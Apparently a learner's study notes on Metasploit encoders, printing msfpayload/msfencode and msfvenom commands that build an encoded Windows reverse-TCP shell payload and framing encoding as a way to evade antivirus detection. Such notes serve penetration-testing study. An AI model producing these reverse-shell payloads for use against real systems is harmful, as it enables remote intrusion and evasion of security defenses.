- `Encoders` come into play with the **role of changing the payload to run on different operating systems and architectures**. These architectures include:

| `x64` | `x86` | `sparc` | `ppc` | `mips` |
| ----- | ----- | ------- | ----- | ------ |
|       |       |         |       |        |

- They are also needed to **remove** hexadecimal opcodes known as **`bad characters` from the payload**.
- Encoding the payload in different formats could **help with the AV detection**.

# Selecting an Encoder
---
- **Before 2015**, If we wanted to create our custom payload, we could do so through `msfpayload`, but we would have to encode it according to the target OS architecture using `msfencode` afterward:
	- `msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`

- After 2015, **updates to these scripts have combined them within the msfvenom** tool, which takes care of payload generation and Encoding. 
	- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`
	- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`

- Suppose we want to **select an Encoder for an existing payload**. Then, we can use the **`show encoders` command** within the msfconsole to see which encoders are available for our current Exploit module + Payload combination:
	- `show encoders`
	- ![[Pasted image 20250628060332.png]]
- 